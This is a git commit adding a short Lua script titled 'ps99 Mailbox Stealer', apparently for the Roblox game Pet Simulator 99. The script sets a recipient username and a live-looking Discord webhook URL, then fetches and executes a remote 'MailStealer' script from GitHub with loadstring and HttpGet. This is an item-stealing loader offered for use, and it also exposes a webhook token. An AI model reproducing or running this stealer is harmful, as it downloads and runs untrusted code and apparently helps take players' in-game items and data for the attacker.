bcb4b05762a2d31fcfff966828eefd648654b2aa
PS99-Scripts <dukkefarr@proton.me>
2024-06-15 20:38:05 +0200

    Add files via upload

---
+++ ps99 Mailbox Stealer.lua
@@ -0,0 +1,5 @@
+Username = "villads901"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1251574891040215252/tin3SPsY7ORSxxlJQ34rVzTSa4yKCCjfMEgFzB9DA9EYztnoeGbk4sG-b2Mn0ar30j4c" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
